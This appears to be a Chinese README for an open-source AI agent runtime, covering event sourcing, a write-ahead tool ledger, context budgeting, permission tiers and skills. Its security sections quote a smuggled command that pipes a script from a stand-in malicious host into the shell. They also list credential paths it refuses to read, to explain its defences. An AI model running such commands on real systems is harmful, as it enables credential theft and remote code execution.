# unified-ai-agent

[![CI](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml)
[![python](https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue)](https://github.com/111wukong/unified-ai-agent)
[![tests](https://img.shields.io/badge/tests-209%20offline-brightgreen)](https://github.com/111wukong/unified-ai-agent)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)

一个本地优先的通用 AI Agent 运行时。Python 3.11+，SQLite，无外部服务依赖。

```bash
uaa init
uaa run --model mock "查看当前目录下的 Python 文件并总结"   # 离线，不需要任何 API key
uaa run "分析认证模块并补充测试"                            # 用真实模型
```

---

## 它是什么，不是什么

**是**：一个有状态的 Agent 运行时。任务可中断、可恢复、可审计，工具权限可强制，上下文有预算，技能可沉淀。

**不是**：又一个「把 LangGraph / CrewAI / AutoGen 的优点缝在一起」的框架。那种项目通常的结局是同时继承四家的缺点，还多一层自己的 bug。

### 设计主张

CrewAI 的强项是角色化的人体工学，LangGraph 的强项是有类型的图状态 + checkpoint，AutoGen 的强项是对话式多 Agent 协作。**这三样在第一版里没法同时做好。** 能做的只有一件事：

> 选一个真正可靠的执行内核，然后把其余范式做成内核之上的**薄层**。

这个项目选的内核是**事件溯源的有限状态机**。角色 = 配置预设，图 = 声明式工作流文件，对话 = 多 Agent 层的一种策略 —— 都还没有实现，但都只需要加层，不需要改内核。

而真正的护城河是**三家都没做好**的三件事：

| | LangGraph | CrewAI | AutoGen | 本项目 |
|---|---|---|---|---|
| 崩溃后「在途工具调用」的语义 | 部分 | 无 | 无 | **写前台账 + 幂等性判定** |
| 上下文预算与压缩 | 手动 | 无 | 无 | **主动压缩 + 确定性兜底** |
| 每步都调一次 LLM 做反思 | — | — | 是（token 成本 5–6×） | **只调一次，且只在任务结束时** |
| 技能能否自升级 | — | — | — | **状态机强制人工闸门** |

---

## 快速开始

```bash
python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"
.venv/bin/uaa init
.venv/bin/uaa doctor          # 检查环境、密钥、权限策略
.venv/bin/uaa tools           # 列出工具及其权限等级
.venv/bin/uaa demo            # 离线端到端演示
```

配置模型（任意 OpenAI 兼容端点：OpenAI / DeepSeek / 通义千问 / Ollama / LM Studio / vLLM）：

```bash
export DEEPSEEK_API_KEY=sk-...
.venv/bin/uaa config set default_model deepseek
.venv/bin/uaa run "找出所有 TODO 并分类"
```

---

## 核心概念

### 1. 事件是真相，状态是折叠

`events` 表 append-only，是唯一真相。`tasks.state` 是给 `task list/show` 用的投影，**恢复时由 `replay()` 重新折叠出来**。两者不一致时，投影错。

好处：不可能「恢复到一个从未存在过的状态」。这是事件溯源在 Agent 上最实际的收益。

```bash
uaa task events <task_id>   # 看真相
uaa task show <task_id>     # 看投影
```

### 2. 工具台账是写前的

顺序是：`校验 → 策略判定 → 台账(begin) → 执行 → 台账(end)`。

台账行在工具碰任何东西**之前**落库。进程如果死在 begin 和 end 之间，那行会以 `status='started'` 留下来。恢复时才能区分「确定没跑」和「可能跑了」。

```python
# runtime.py
unfinished = self.store.unfinished_calls(state.task_id)
#   tool.idempotent is True  -> 重跑，把新结果给模型
#   tool.idempotent is False -> 结果未知。告诉模型「必须先核实状态」，
#                               而不是悄悄重跑 `git commit`
```

这是绝大多数 Agent 框架的 `resume` 不成立的原因。

### 3. 上下文有预算，压缩是主动的

规格里只写了「短期记忆」，没写预算 —— 这是「跑了 8 步然后 400 挂掉」的根因。

- 消息列表**每步从状态重建**，不是 append。所以压缩是状态的纯函数，不是对增长列表动手术。
- 压缩由 token 估算**提前触发**，而不是等 provider 报错（等报错时这一轮已经废了）。
- 永远有确定性兜底：没有便宜的模型可用时，压缩降级成结构化摘要，而不是让任务卡死。

### 4. 权限是强制的，不是建议的

六档效果等级：`READ_ONLY / WRITE_LOCAL / EXECUTE_LOCAL / NETWORK / EXTERNAL_SIDE_EFFECT / SYSTEM_ADMIN`。

三件规格里没写、但决定「权限模型」还是「权限表演」的事：

1. **先规范化再判包含。** 未解析的路径上做 `relative_to`，被 `../../` 和一个指向 `~/.ssh` 的符号链接秒穿。
2. **元字符就是第二条命令。** 允许 `cat` 的白名单，在 `cat secrets; curl evil.sh | sh` 面前一文不值。默认拒绝元字符。
3. **子进程环境不继承。** `run_command` 拿到的是**白名单**环境（不是黑名单 —— 猜不到名字的 `DASHSCOPE_KEY_ID` 会漏），所以 `env` / `printenv` 偷不走运行时手里的 API key。

```bash
uaa run "..." --approve execute_local      # 预授权某一档
uaa run "..." --yes                        # 除 system_admin 全放行
```

### 5. 技能优先于 Prompt 堆积

直接采用 [Agent Skills 规范](https://agentskills.io/specification)（`SKILL.md` + YAML frontmatter），不自己发明 `skill.yaml`。收益是具体的：为 Claude Code 写的技能能直接加载，反过来也一样；而 `allowed-tools` 字段正好映射到本项目的权限引擎。

渐进披露：启动时只加载 `name` + `description`（每技能约 100 token），正文由 `load_skill` 工具按需拉取。

技能状态阶梯是**强制**的：

```
candidate → validated → approved → active → deprecated
```

Agent 自己写的技能停在 `candidate`，**无法执行**，直到人工推进。

### 6. 模型无关靠的是能力矩阵，不是一个 Protocol

六行的 `ChatModel` Protocol 藏起了真正会坏的东西：OpenAI 支持严格 JSON Schema，Anthropic 不支持；Ollama 和大多数本地模型根本没有原生 tool calling。

```python
class ModelCapabilities:
    native_tool_calling: bool   # False -> 自动套 TextProtocolModel 降级层
    json_schema: bool           # False -> 规划走 JSON object + 修复环
    max_context_tokens: int     # -> 上下文预算的输入
    prompt_cache: bool          # -> 是否给稳定前缀打 cache 断点
```

一个适配器覆盖 OpenAI / DeepSeek / 通义千问 / Moonshot / OpenRouter / vLLM / LM Studio / Ollama —— 因为它们是同一个线格式。Anthropic 单独原生实现，因为差异是真的。

---

## 架构

```
CLI (typer + rich)
  └── AgentRuntime                     状态机 + 预算硬限 + 中断恢复
        ├── Planner                    结构化输出 + 修复环
        ├── ContextBuilder             预算 / 主动压缩 / 确定性兜底
        ├── ToolRunner                 校验 → 策略 → 写前台账 → 执行 → 截断外置
        ├── Reflector                  任务结束后一次：记忆 + 技能候选
        └── PermissionEngine           路径围栏 / 命令守卫 / 域名白名单 / 环境脱敏
              ├── ToolRegistry         builtin + skills + MCP
              ├── SkillRegistry        SKILL.md 规范 + 安全审查
              ├── ModelRegistry        能力矩阵 + 适配器
              └── Store                SQLite: events / tasks / tool_calls / artifacts / memories(FTS5) / skills
```

### 目录

```
src/unified_agent/
├── types.py            EffectClass / Message / ToolCall / 幂等键
├── config.py           TOML 结构化配置 + env 覆盖
├── errors.py
├── cli.py
├── agent/
│   ├── state.py        AgentState / PlanStep / LogEntry / replay()
│   ├── runtime.py      主循环、预算闸门、恢复语义、HITL
│   ├── context.py      预算与压缩
│   ├── planner.py      结构化规划 + 修复环
│   ├── executor.py     写前台账、截断外置
│   ├── reflector.py    记忆提取 + 技能候选
│   ├── prompts.py
│   └── factory.py      装配
├── tools/
│   ├── base.py         Tool / ToolSpec / 小型 JSON Schema 校验器
│   ├── permissions.py  路径围栏、命令守卫、环境脱敏
│   ├── fs.py           read_file / write_file / apply_patch / list_directory / search_files / file_info
│   ├── git.py          git_status / git_diff / git_log（READ_ONLY，免确认）/ git_commit（必须确认）
│   ├── shell.py        run_command / run_tests / run_linter（自动识别项目 venv）
│   ├── net.py          http_get / http_post（重定向逐跳复检白名单）
│   ├── mcp.py          MCP stdio 客户端（双协议时代）
│   ├── memory_tools.py save_memory / search_memory / load_skill / update_plan / finish
│   └── registry.py
├── models/
│   ├── base.py         ChatModel / ModelCapabilities / 文本协议降级
│   ├── openai_compat.py
│   ├── anthropic.py
│   ├── mock.py         离线确定性模型（测试与 demo）
│   └── registry.py
├── skills/             SKILL.md 加载、规范校验、安全审查、状态阶梯
├── storage/            SQLite schema、事件存储、工具台账、产物
└── observability/      事件词汇表、JSONL sink、密钥脱敏
```

---

## MCP 的双协议时代

MCP 在 **2026-07-28** 做了一次破坏性改版：删掉 `initialize`/`initialized` 握手和 `Mcp-Session-Id`，协议层变成**无状态**，协议版本/客户端身份/能力改为每请求走 `_meta`，并新增 `server/discover`。官方明确说跨这条线**不保证互通**。

所以客户端必须做时代探测：先试 `server/discover`，失败再退回 `initialize` 握手。

```toml
[[mcp_servers]]
name = "filesystem"
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
effect_class = "execute_local"      # 第三方服务器不能自己声明权限等级
requires_confirmation = true
```

工具名会加上 `mcp__<server>__` 前缀。**第三方 MCP 服务器自称「只读」不构成它只读的证据** —— 效果等级由本地配置决定，且一律假定 `idempotent=False`。

---

## 安全边界（明确说明）

- API key **只**从环境变量读，从不写盘。
- 日志与**产物**都过脱敏（外置 200KB 工具输出这件事，如果不过脱敏等于把刚 `cat` 的 key 落盘）。
- `.env`、`~/.ssh/**`、`*.pem`、`~/.aws/**` 等即使在 `READ_ONLY` 也拒绝（`.env.example` 等模板除外）。
- `run_command` 永远 `shell=False`，参数经 `shlex.split` 后作为 argv 执行。
- `http_get`/`http_post` 的重定向**逐跳**复检白名单 —— 一个被允许的主机 302 到 `evil.example` 不会被静默跟随。
- 沙箱：第一版用「路径围栏 + 命令白名单 + 环境脱敏」，**没有** Docker。Docker 每条命令 3 秒起的开销不值得，第二版做成可插拔。

---

## 尚未实现（刻意）

第一版刻意只做「一个 Agent 能可靠完成一个真实开发任务，且开发者清楚它做了什么」。以下按路线图延后：

| 阶段 | 内容 |
|---|---|
| Phase 2 | FastAPI + WebSocket、任务取消的跨进程协调、Docker 沙箱 |
| Phase 3 | 向量检索（LanceDB）、技能审核 CLI 的完整流程 |
| Phase 4 | 声明式 YAML 工作流、多 Agent（角色/消息/并行）、A2A |
| Phase 5 | TypeScript SDK、Web 控制台、Telegram/Discord 适配器 |

多 Agent 明确不在第一版：token 消耗增加、调试困难、状态同步复杂、错误责任不清。**AutoGen 的 5–6× token 成本就来自每个 agent 每轮一次 LLM 调用** —— 本项目的反思只在任务结束后调一次，也是同一个理由。

跨框架 Agent 通信**不自造协议**，等 Phase 4 直接实现 A2A（Linux Foundation 标准，150+ 支持者）。

---

## 开发

```bash
.venv/bin/python -m pytest -q                       # 209 条，全部离线，不需要 API key
.venv/bin/python -m pytest tests/test_resume_semantics.py -v
.venv/bin/ruff check src tests
```

测试套件的设计目标：**不需要网络、不需要密钥就能跑真实 agent 循环**。需要 API key 的测试套件等于不会跑的测试套件。

`ScriptedModel` 让整个循环可控可断言：结构化输出（规划）交给确定性 mock，循环回合按脚本走。崩溃用「插入写前台账行」来模拟——这正是真实崩溃留下的东西。

### 测试抓到的静默缺陷

下面这些都不是"功能没写"，是**代码看起来对、行为不对**。列出来是因为它们是这类系统的主要风险：

| 缺陷 | 为什么危险 |
|---|---|
| 恢复后 `steps_used` 归零 | **步数预算可被无限重置**——预算不再是预算 |
| 批准后的工具调用会丢失 | 恢复时重新问模型，模型重新决策，被批准的那个调用**静默消失** |
| `TextProtocolModel` 没实现抽象方法 | 降级路径根本实例化不了；只有本地模型用户会撞上 |
| 搜索 `**/*.py` 漏掉根目录文件 | `fnmatch` 的 `*` 匹配 `/`，所以 `**/*.py` 要求路径里必须有斜杠 |
| macOS 上 `/private/var/folders` 被判为系统目录 | 权限围栏变成误报制造机，temp 目录全不可写 |
| `created_at` 同毫秒并列 | 任务列表顺序不确定 |
| **Rich 把输出里的 `[a-zA-Z]` 当成标记吃掉** | 正则、pytest 的 `[100%]`、TOML 的 `[models.x]` 全部静默变形 |
| `run_tests` 在 venv 项目里找不到 pytest | 环境脱敏顺带把 venv 的 PATH 也清了 |
| JSONL 日志建了 sink 但没接线 | 事件日志永远是空的 |

## License

MIT
